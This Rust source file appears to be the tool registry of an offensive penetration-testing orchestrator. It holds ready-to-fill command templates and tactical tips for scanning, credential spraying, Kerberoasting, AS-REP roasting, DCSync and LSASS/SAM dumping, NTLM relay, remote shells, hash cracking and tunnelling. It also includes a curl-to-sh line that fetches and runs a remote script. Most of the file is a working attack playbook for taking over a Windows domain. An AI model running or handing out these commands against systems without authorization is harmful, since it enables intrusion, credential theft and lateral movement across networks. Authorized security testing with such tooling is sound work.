//! The tool registry. Add entries here to teach warden a new technique.
//!
//! Every command uses `{placeholder}` slots resolved from the engagement state.
//! Unfilled slots are prompted for interactively rather than silently guessed.

use super::{Applies, Speed, Tool, Yields::*};
use crate::model::Phase::*;

/// Baseline preconditions; entries override only what they need.
const AP: Applies = Applies {
    any_port: &[],
    service_like: None,
    banner_like: None,
    needs_cred: false,
    needs_domain: false,
    needs_dc: false,
    needs_compromised: false,
    needs_hashes: false,
    windows_only: false,
    linux_only: false,
    global: false,
};

macro_rules! tool {
    ($id:literal, $name:literal, [$($bin:literal),+], $phase:expr, $speed:expr,
     $applies:expr, $tpl:literal, $desc:literal, $note:literal,
     yields: [$($y:expr),*], weight: $w:literal $(, interactive: $i:literal)?) => {
        Tool {
            id: $id, name: $name, bins: &[$($bin),+], phase: $phase, desc: $desc,
            template: $tpl, speed: $speed, interactive: false $(|| $i)?,
            yields: &[$($y),*], applies: $applies, note: $note, weight: $w,
        }
    };
}

pub static REGISTRY: &[Tool] = &[
    // ───────────────────────────── discovery / port scanning
    tool!("nmap-ping", "nmap host discovery", ["nmap"], Discovery, Speed::Fast,
        Applies { global: true, ..AP },
        "nmap -sn {subnet} -oX {outfile}",
        "Sweep a subnet for live hosts",
        "No port scan — just find what is alive. Run this first on any new segment.",
        yields: [Hosts], weight: 90),

    tool!("nmap-quick", "nmap top-1000 + versions", ["nmap"], PortScan, Speed::Medium,
        Applies { global: true, ..AP },
        "nmap -sCV -Pn -T4 {target} -oX {outfile}",
        "Default scripts + version detection on the top 1000 ports",
        "Fast first look. Always follow with a full -p- sweep — filtered hosts hide ports.",
        yields: [Ports, Services], weight: 88),

    tool!("nmap-full", "nmap all 65535 ports", ["nmap"], PortScan, Speed::Slow,
        Applies { global: true, ..AP },
        "nmap -p- --min-rate 2000 -Pn -T4 {target} -oX {outfile}",
        "Full TCP port sweep",
        "The single highest-value scan. Non-standard ports are where the third-party \
         software with a public exploit lives — a top-1000 scan will never see them.",
        yields: [Ports], weight: 95),

    tool!("nmap-udp", "nmap top UDP ports", ["nmap"], PortScan, Speed::Slow,
        Applies { global: true, ..AP },
        "nmap -sU --top-ports 100 -Pn {target} -oX {outfile}",
        "UDP scan of the 100 most common ports",
        "SNMP (161), TFTP (69) and IKE (500) are routinely missed because nobody scans UDP.",
        yields: [Ports], weight: 40),

    tool!("nmap-vuln", "nmap vuln scripts", ["nmap"], VulnScan, Speed::Slow,
        Applies { global: true, ..AP },
        "nmap --script vuln -Pn {target} -oX {outfile}",
        "Run the NSE vuln category",
        "Noisy and false-positive prone, but catches the obvious unpatched cases.",
        yields: [Vulns], weight: 50),

    tool!("rustscan", "rustscan", ["rustscan"], PortScan, Speed::Fast,
        Applies { global: true, ..AP },
        "rustscan -a {target} --ulimit 5000 -- -sCV",
        "Very fast full-port sweep, pipes into nmap for versions",
        "Much faster than nmap -p- when the network tolerates the packet rate.",
        yields: [Ports, Services], weight: 85),

    tool!("masscan", "masscan", ["masscan"], PortScan, Speed::Fast,
        Applies { global: true, ..AP },
        "masscan {subnet} -p1-65535 --rate 10000 -oJ {outfile}",
        "Internet-scale SYN scanner",
        "Use for wide subnet sweeps, then re-scan the hits with nmap -sCV for detail.",
        yields: [Hosts, Ports], weight: 60),

    // ───────────────────────────── web enumeration
    tool!("whatweb", "whatweb", ["whatweb"], WebEnum, Speed::Fast,
        Applies { service_like: Some("http"), ..AP },
        "whatweb -a3 {url}",
        "Fingerprint the web stack",
        "Identifies CMS, framework and version — feeds directly into searchsploit.",
        yields: [Vulns], weight: 80),

    tool!("httpx", "httpx probe", ["httpx"], WebEnum, Speed::Fast,
        Applies { service_like: Some("http"), ..AP },
        "httpx -u {url} -title -tech-detect -status-code -follow-redirects -json -o {outfile}",
        "Probe and fingerprint HTTP services",
        "Resolves http vs https automatically and reports the real title and tech stack.",
        yields: [Vulns], weight: 78),

    tool!("nuclei", "nuclei", ["nuclei"], VulnScan, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "nuclei -u {url} -severity critical,high,medium -jsonl -o {outfile}",
        "Template-driven vulnerability scanner",
        "Highest signal-to-noise web scanner available. Keep templates updated.",
        yields: [Vulns], weight: 82),

    tool!("feroxbuster", "feroxbuster", ["feroxbuster"], DirEnum, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "feroxbuster -u {url} -w {wordlist} -x php,txt,html,bak,zip,db,old -d 2 -k --json -o {outfile}",
        "Recursive content discovery",
        "Recursion is what finds /database/, /backup/ and /logs/ — the directories that \
         hold the credentials.",
        yields: [WebPaths], weight: 88),

    tool!("ffuf-dir", "ffuf directory fuzz", ["ffuf"], DirEnum, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "ffuf -u {url}/FUZZ -w {wordlist} -mc all -fc 404 -o {outfile} -of json",
        "Fuzz for directories and files",
        "Tune -fs/-fw to filter the soft-404 size once you see the baseline response.",
        yields: [WebPaths], weight: 84),

    tool!("ffuf-vhost", "ffuf vhost fuzz", ["ffuf"], WebEnum, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "ffuf -u {url} -H 'Host: FUZZ.{domain}' -w {vhostlist} -mc all -fs 0 -o {outfile} -of json",
        "Discover virtual hosts",
        "Different vhosts on the same IP are effectively different applications.",
        yields: [Vhosts], weight: 70),

    tool!("gobuster-dns", "gobuster DNS", ["gobuster"], WebEnum, Speed::Medium,
        Applies { needs_domain: true, global: true, ..AP },
        "gobuster dns -d {domain} -w {vhostlist} -o {outfile}",
        "Brute-force subdomains",
        "",
        yields: [Hosts], weight: 55),

    tool!("katana", "katana crawler", ["katana"], WebEnum, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "katana -u {url} -jc -kf all -d 3 -o {outfile}",
        "Crawl the application for endpoints and JS-referenced routes",
        "JavaScript files leak API routes and parameter names that no wordlist contains.",
        yields: [WebPaths], weight: 72),

    tool!("nikto", "nikto", ["nikto"], VulnScan, Speed::Slow,
        Applies { service_like: Some("http"), ..AP },
        "nikto -h {url} -o {outfile} -Format txt",
        "Classic web server misconfiguration scanner",
        "Dated and noisy, but still finds exposed backup files and dangerous methods.",
        yields: [Vulns], weight: 45),

    tool!("wpscan", "wpscan", ["wpscan"], VulnScan, Speed::Medium,
        Applies { banner_like: Some("wordpress"), ..AP },
        "wpscan --url {url} --enumerate u,vp,vt --random-user-agent -o {outfile}",
        "WordPress-specific enumeration",
        "Enumerates users for password attacks and vulnerable plugins for direct RCE.",
        yields: [Users, Vulns], weight: 80),

    tool!("sqlmap", "sqlmap", ["sqlmap"], Exploit, Speed::Slow,
        Applies { service_like: Some("http"), ..AP },
        "sqlmap -u '{url}' --batch --level 2 --risk 2 --output-dir {outdir}",
        "Automated SQL injection detection and exploitation",
        "Use --forms or -r request.txt for authenticated endpoints. --os-shell when injectable.",
        yields: [Credentials, Shell], weight: 68),

    tool!("wafw00f", "wafw00f", ["wafw00f"], WebEnum, Speed::Fast,
        Applies { service_like: Some("http"), ..AP },
        "wafw00f {url}",
        "Detect a WAF in front of the application",
        "Knowing the WAF up front saves you from burning the target with blocked payloads.",
        yields: [Vulns], weight: 40),

    // ───────────────────────────── API
    tool!("ffuf-api", "ffuf API routes", ["ffuf"], ApiEnum, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "ffuf -u {url}/FUZZ -w {apilist} -mc all -fc 404 -H 'Content-Type: application/json' -o {outfile} -of json",
        "Fuzz for API endpoints",
        "",
        yields: [WebPaths], weight: 60),

    tool!("arjun", "arjun", ["arjun"], ApiEnum, Speed::Medium,
        Applies { service_like: Some("http"), ..AP },
        "arjun -u {url} -oJ {outfile}",
        "Discover hidden HTTP parameters",
        "Hidden params are where LFI and IDOR live — ?file=, ?page=, ?id=.",
        yields: [WebPaths], weight: 62),

    // ───────────────────────────── SMB / network services
    tool!("nxc-smb-null", "netexec SMB null session", ["nxc", "netexec", "crackmapexec"],
        SmbEnum, Speed::Fast,
        Applies { any_port: &[445, 139], ..AP },
        "nxc smb {ip} -u '' -p '' --shares --users --pass-pol",
        "Try an unauthenticated SMB session",
        "A null or guest session frequently leaks the full user list, which is all you \
         need to start AS-REP roasting.",
        yields: [Users, Shares, DomainInfo], weight: 92),

    tool!("nxc-smb-guest", "netexec SMB guest", ["nxc", "netexec"], SmbEnum, Speed::Fast,
        Applies { any_port: &[445], ..AP },
        "nxc smb {ip} -u 'guest' -p '' --shares",
        "Try the guest account",
        "Guest is often left enabled when null sessions are blocked.",
        yields: [Shares], weight: 86),

    tool!("nxc-smb-auth", "netexec SMB (authenticated)", ["nxc", "netexec"], SmbEnum, Speed::Fast,
        Applies { any_port: &[445], needs_cred: true, ..AP },
        "nxc smb {ip} -u '{user}' -p '{pass}' -d {domain} --shares --users --pass-pol",
        "Authenticated SMB enumeration",
        "Watch for (Pwn3d!) in the output — that means local admin and a direct path to SYSTEM.",
        yields: [Shares, Users], weight: 90),

    tool!("nxc-spray", "netexec credential spray", ["nxc", "netexec"], CredAccess, Speed::Medium,
        Applies { needs_cred: true, global: true, ..AP },
        "nxc smb {subnet} -u '{user}' -p '{pass}' -d {domain} --continue-on-success",
        "Spray one credential across a whole subnet",
        "Password reuse is the single most reliable lateral-movement path. Spray every \
         credential across every host the moment you recover it.",
        yields: [Session], weight: 94),

    tool!("smbclient-list", "smbclient share list", ["smbclient"], SmbEnum, Speed::Fast,
        Applies { any_port: &[445, 139], ..AP },
        "smbclient -N -L //{ip}/",
        "List shares anonymously",
        "",
        yields: [Shares], weight: 80),

    tool!("smbmap", "smbmap recursive", ["smbmap"], SmbEnum, Speed::Medium,
        Applies { any_port: &[445], needs_cred: true, ..AP },
        "smbmap -H {ip} -u '{user}' -p '{pass}' -d {domain} -R",
        "Recursively list share contents with permissions",
        "Shows READ/WRITE per share. A writable share is a payload drop or a coerced-auth trigger.",
        yields: [Files, Shares], weight: 82),

    tool!("enum4linux-ng", "enum4linux-ng", ["enum4linux-ng", "enum4linux"], SmbEnum, Speed::Medium,
        Applies { any_port: &[445, 139], ..AP },
        "enum4linux-ng -A {ip} -oJ {outfile}",
        "Broad SMB/RPC/LDAP enumeration sweep",
        "One command that pulls users, groups, shares, password policy and OS info.",
        yields: [Users, Shares, DomainInfo], weight: 84),

    tool!("rpcclient-users", "rpcclient enumdomusers", ["rpcclient"], SmbEnum, Speed::Fast,
        Applies { any_port: &[135, 139, 445], ..AP },
        "rpcclient -U '' -N {ip} -c 'enumdomusers;enumdomgroups;querydispinfo'",
        "Enumerate domain users over RPC",
        "Works even when SMB share listing is denied.",
        yields: [Users], weight: 78),

    tool!("showmount", "showmount NFS exports", ["showmount"], SmbEnum, Speed::Fast,
        Applies { any_port: &[2049, 111], ..AP },
        "showmount -e {ip}",
        "List NFS exports",
        "An export with no_root_squash lets you drop a SUID binary and become root.",
        yields: [Shares], weight: 74),

    tool!("snmpwalk", "snmpwalk (public)", ["snmpwalk"], ServiceEnum, Speed::Medium,
        Applies { any_port: &[161], ..AP },
        "snmpwalk -v2c -c public {ip} 1.3.6.1.2.1.25.4.2.1.2",
        "Walk the running-process table over SNMP",
        "Process arguments frequently contain plaintext passwords.",
        yields: [Credentials, Users], weight: 76),

    // ───────────────────────────── Active Directory enumeration
    tool!("ntpdate", "sync clock to DC", ["ntpdate", "sntp", "rdate"], AdEnum, Speed::Fast,
        Applies { needs_dc: true, global: true, ..AP },
        "ntpdate -u {dc_ip}",
        "Synchronise local clock with the domain controller",
        "Kerberos rejects any request with more than 5 minutes of clock skew. When \
         impacket returns KRB_AP_ERR_SKEW, this is the fix — run it before anything Kerberos.",
        yields: [], weight: 99),

    tool!("bloodhound-py", "bloodhound-python", ["bloodhound-python", "bloodhound.py"],
        AdEnum, Speed::Medium,
        Applies { needs_cred: true, needs_dc: true, global: true, ..AP },
        "bloodhound-python -d {domain} -u '{user}' -p '{pass}' -ns {dc_ip} -c All --zip",
        "Collect the full AD graph for BloodHound",
        "Do not guess at the attack path — collect the graph and let it tell you. Run \
         this the moment you hold any valid domain credential.",
        yields: [DomainInfo, Users], weight: 96),

    tool!("nxc-ldap", "netexec LDAP enum", ["nxc", "netexec"], AdEnum, Speed::Fast,
        Applies { any_port: &[389, 636, 3268], needs_cred: true, ..AP },
        "nxc ldap {ip} -u '{user}' -p '{pass}' -d {domain} --users --groups --password-not-required --trusted-for-delegation",
        "LDAP enumeration of users, groups and delegation",
        "--trusted-for-delegation surfaces unconstrained delegation hosts, a fast route to DA.",
        yields: [Users, DomainInfo], weight: 88),

    tool!("ldapsearch-anon", "ldapsearch (anonymous)", ["ldapsearch"], AdEnum, Speed::Fast,
        Applies { any_port: &[389], ..AP },
        "ldapsearch -x -H ldap://{ip} -s base namingcontexts",
        "Anonymous LDAP base query",
        "Reveals the naming context (domain DN) with no credentials at all.",
        yields: [DomainInfo], weight: 82),

    tool!("certipy-find", "certipy find (ADCS)", ["certipy-ad", "certipy"], AdEnum, Speed::Medium,
        Applies { needs_cred: true, needs_dc: true, global: true, ..AP },
        "certipy-ad find -u '{upn}' -p '{pass}' -dc-ip {dc_ip} -vulnerable -stdout",
        "Enumerate AD Certificate Services for ESC1-ESC13",
        "ADCS misconfigurations are the most reliable modern path to Domain Admin. \
         ESC1 alone turns any domain user into DA.",
        yields: [Vulns, DomainInfo], weight: 93),

    tool!("getaduser", "impacket GetADUsers", ["impacket-GetADUsers", "GetADUsers.py"],
        AdEnum, Speed::Fast,
        Applies { needs_cred: true, needs_dc: true, global: true, ..AP },
        "impacket-GetADUsers -all {domain}/'{user}':'{pass}' -dc-ip {dc_ip}",
        "List all domain users with last-logon data",
        "",
        yields: [Users], weight: 80),

    // ───────────────────────────── AD attacks
    tool!("asreproast", "AS-REP roast", ["impacket-GetNPUsers", "GetNPUsers.py"],
        CredAccess, Speed::Fast,
        Applies { needs_dc: true, global: true, ..AP },
        "impacket-GetNPUsers {domain}/ -usersfile {userlist} -dc-ip {dc_ip} -no-pass -format hashcat -outputfile {outfile}",
        "Request AS-REP hashes for pre-auth-disabled accounts",
        "Needs NO credentials — only a username list. Always try this first against a \
         domain you have no foothold in. Crack with hashcat -m 18200.",
        yields: [Hashes], weight: 95),

    tool!("kerberoast", "Kerberoast", ["impacket-GetUserSPNs", "GetUserSPNs.py"],
        CredAccess, Speed::Fast,
        Applies { needs_cred: true, needs_dc: true, global: true, ..AP },
        "impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/'{user}':'{pass}' -outputfile {outfile}",
        "Request TGS hashes for every SPN-bearing account",
        "Any valid domain user can do this. Service accounts often have weak, \
         never-rotated passwords. Crack with hashcat -m 13100.",
        yields: [Hashes], weight: 94),

    tool!("secretsdump", "impacket secretsdump", ["impacket-secretsdump", "secretsdump.py"],
        CredAccess, Speed::Medium,
        Applies { needs_cred: true, any_port: &[445], ..AP },
        "impacket-secretsdump {domain}/'{user}':'{pass}'@{ip} -outputfile {outfile}",
        "Dump SAM, LSA secrets and (on a DC) the whole NTDS via DCSync",
        "Against a DC with DCSync rights this dumps every hash in the domain, including \
         krbtgt — which is game over.",
        yields: [Hashes, Credentials], weight: 96),

    tool!("psexec", "impacket psexec", ["impacket-psexec", "psexec.py"], Exploit, Speed::Fast,
        Applies { needs_cred: true, any_port: &[445], ..AP },
        "impacket-psexec {domain}/'{user}':'{pass}'@{ip}",
        "SYSTEM shell over SMB (creates a service)",
        "Loud — it drops a binary and creates a service. Prefer wmiexec for stealth.",
        yields: [Shell], weight: 84, interactive: true),

    tool!("wmiexec", "impacket wmiexec", ["impacket-wmiexec", "wmiexec.py"], Exploit, Speed::Fast,
        Applies { needs_cred: true, any_port: &[135], ..AP },
        "impacket-wmiexec {domain}/'{user}':'{pass}'@{ip}",
        "Semi-interactive shell over WMI",
        "Quieter than psexec — no service creation, no binary on disk.",
        yields: [Shell], weight: 86, interactive: true),

    tool!("evil-winrm", "evil-winrm", ["evil-winrm"], Exploit, Speed::Fast,
        Applies { needs_cred: true, any_port: &[5985, 5986], ..AP },
        "evil-winrm -i {ip} -u '{user}' -p '{pass}'",
        "Interactive PowerShell over WinRM",
        "Accepts -H <nthash> for pass-the-hash. Requires Remote Management Users or local admin.",
        yields: [Shell], weight: 90, interactive: true),

    tool!("nxc-winrm", "netexec WinRM check", ["nxc", "netexec"], Exploit, Speed::Fast,
        Applies { any_port: &[5985, 5986], needs_cred: true, ..AP },
        "nxc winrm {ip} -u '{user}' -p '{pass}' -d {domain}",
        "Test WinRM access before committing to a shell",
        "",
        yields: [Session], weight: 88),

    tool!("ntlmrelayx", "impacket ntlmrelayx", ["impacket-ntlmrelayx", "ntlmrelayx.py"],
        CredAccess, Speed::VerySlow,
        Applies { global: true, ..AP },
        "impacket-ntlmrelayx -tf {relaylist} -smb2support -socks",
        "Relay incoming NTLM authentications to other hosts",
        "Only works against targets with SMB signing NOT required. Pair with responder \
         or a coerced auth (PetitPotam / PrinterBug) to force the authentication.",
        yields: [Session, Hashes], weight: 78),

    tool!("responder", "Responder", ["responder", "Responder.py"], CredAccess, Speed::VerySlow,
        Applies { global: true, ..AP },
        "responder -I {iface} -dwv",
        "Poison LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes",
        "Extremely effective on real internal networks. Crack captures with hashcat -m 5600.",
        yields: [Hashes], weight: 76),

    tool!("mssqlclient", "impacket mssqlclient", ["impacket-mssqlclient", "mssqlclient.py"],
        Exploit, Speed::Fast,
        Applies { any_port: &[1433], needs_cred: true, ..AP },
        "impacket-mssqlclient {domain}/'{user}':'{pass}'@{ip} -windows-auth",
        "Interactive MSSQL client",
        "Then: enable_xp_cmdshell, xp_cmdshell whoami, enum_links, enum_impersonate. \
         Linked servers frequently bridge into otherwise unreachable hosts.",
        yields: [Shell], weight: 84, interactive: true),

    // ───────────────────────────── cracking
    tool!("hashcat-ntlm", "hashcat NTLM (m1000)", ["hashcat"], Cracking, Speed::Slow,
        Applies { needs_hashes: true, global: true, ..AP },
        "hashcat -m 1000 {hashfile} {passlist} -O --status",
        "Crack NTLM hashes",
        "",
        yields: [Credentials], weight: 70),

    tool!("hashcat-asrep", "hashcat AS-REP (m18200)", ["hashcat"], Cracking, Speed::Slow,
        Applies { needs_hashes: true, global: true, ..AP },
        "hashcat -m 18200 {hashfile} {passlist} -O --status",
        "Crack AS-REP roast output",
        "",
        yields: [Credentials], weight: 88),

    tool!("hashcat-tgs", "hashcat TGS-REP (m13100)", ["hashcat"], Cracking, Speed::Slow,
        Applies { needs_hashes: true, global: true, ..AP },
        "hashcat -m 13100 {hashfile} {passlist} -O --status",
        "Crack Kerberoast output",
        "",
        yields: [Credentials], weight: 88),

    tool!("hashcat-netntlmv2", "hashcat NetNTLMv2 (m5600)", ["hashcat"], Cracking, Speed::Slow,
        Applies { needs_hashes: true, global: true, ..AP },
        "hashcat -m 5600 {hashfile} {passlist} -O --status",
        "Crack Responder captures",
        "",
        yields: [Credentials], weight: 86),

    tool!("john", "john the ripper", ["john"], Cracking, Speed::Slow,
        Applies { needs_hashes: true, global: true, ..AP },
        "john --wordlist={passlist} {hashfile}",
        "Crack hashes with John",
        "Handy for formats hashcat lacks, and for *2john helper converters.",
        yields: [Credentials], weight: 60),

    tool!("hashid", "name-that-hash", ["nth", "name-that-hash", "hashid"], Cracking, Speed::Fast,
        Applies { global: true, ..AP },
        "nth -f {hashfile}",
        "Identify an unknown hash format",
        "",
        yields: [], weight: 50),

    // ───────────────────────────── pivoting
    tool!("ligolo-proxy", "ligolo-ng proxy (operator side)", ["ligolo-proxy"], Pivot, Speed::VerySlow,
        Applies { global: true, ..AP },
        "ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
        "Start the ligolo-ng listener on your box",
        "The cleanest pivot available: gives you a real TUN interface, so every tool \
         works natively with no proxychains. Then: ip tuntap add user root mode tun ligolo && \
         ip link set ligolo up && ip route add <target-subnet> dev ligolo",
        yields: [Tunnel], weight: 92, interactive: true),

    tool!("chisel-server", "chisel server (operator side)", ["chisel"], Pivot, Speed::VerySlow,
        Applies { global: true, ..AP },
        "chisel server -p 8080 --reverse",
        "Start a chisel reverse-tunnel server",
        "Agent side: chisel client <you>:8080 R:socks — then point proxychains at 127.0.0.1:1080.",
        yields: [Tunnel], weight: 84),

    tool!("sshuttle", "sshuttle", ["sshuttle"], Pivot, Speed::VerySlow,
        Applies { needs_cred: true, global: true, ..AP },
        "sshuttle -r {user}@{ip} {subnet} --ssh-cmd 'ssh -o StrictHostKeyChecking=no'",
        "Transparent VPN-over-SSH into a subnet",
        "Easiest pivot when you have SSH credentials — no proxychains needed.",
        yields: [Tunnel], weight: 80),

    // ───────────────────────────── post-exploitation
    tool!("linpeas", "linPEAS", ["curl"], PrivEsc, Speed::Medium,
        Applies { needs_compromised: true, linux_only: true, ..AP },
        "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "Linux privilege-escalation enumeration",
        "Run it on the target. Read the red/yellow highlights first — those are the \
         confirmed findings.",
        yields: [Vulns], weight: 90),

    tool!("pspy", "pspy", ["pspy64"], PrivEsc, Speed::Medium,
        Applies { needs_compromised: true, linux_only: true, ..AP },
        "./pspy64 -pf -i 1000",
        "Watch processes without root to catch cron jobs",
        "Reveals root cron jobs running writable scripts — a very common privesc.",
        yields: [Vulns], weight: 82),

    tool!("winpeas", "winPEAS", ["curl"], PrivEsc, Speed::Medium,
        Applies { needs_compromised: true, windows_only: true, ..AP },
        ".\\winPEASx64.exe",
        "Windows privilege-escalation enumeration",
        "",
        yields: [Vulns], weight: 90),

    tool!("pypykatz", "pypykatz (offline LSASS)", ["pypykatz"], CredAccess, Speed::Fast,
        Applies { global: true, ..AP },
        "pypykatz lsa minidump {dumpfile}",
        "Parse an LSASS dump offline",
        "Dump on target with procdump/comsvcs, then parse here — no AV interference on \
         your own box.",
        yields: [Credentials, Hashes], weight: 92),

    tool!("nxc-lsassy", "netexec lsassy", ["nxc", "netexec"], CredAccess, Speed::Medium,
        Applies { any_port: &[445], needs_cred: true, ..AP },
        "nxc smb {ip} -u '{user}' -p '{pass}' -d {domain} -M lsassy",
        "Remotely dump LSASS where you have local admin",
        "Requires (Pwn3d!). Yields the cached credentials of every logged-on user.",
        yields: [Credentials, Hashes], weight: 94),

    tool!("nxc-sam", "netexec SAM/LSA dump", ["nxc", "netexec"], CredAccess, Speed::Fast,
        Applies { any_port: &[445], needs_cred: true, ..AP },
        "nxc smb {ip} -u '{user}' -p '{pass}' -d {domain} --sam --lsa",
        "Dump local SAM and LSA secrets",
        "The local Administrator hash is often reused across every workstation in the estate.",
        yields: [Hashes, Credentials], weight: 92),

    // ───────────────────────────── utility
    tool!("searchsploit", "searchsploit", ["searchsploit"], VulnScan, Speed::Fast,
        Applies { global: true, ..AP },
        "searchsploit {query}",
        "Search the exploit-db mirror",
        "Feed it the exact product and version string from the service banner.",
        yields: [Vulns], weight: 74),

    tool!("ftp-anon", "anonymous FTP mirror", ["wget"], Loot, Speed::Medium,
        Applies { any_port: &[21], ..AP },
        "wget -m --no-passive ftp://anonymous:anonymous@{ip}/ -P {outdir}",
        "Mirror an anonymous FTP root",
        "Pull everything, then grep the lot for credentials. Documents and .bak files \
         are where passwords hide.",
        yields: [Files, Credentials], weight: 88),
];
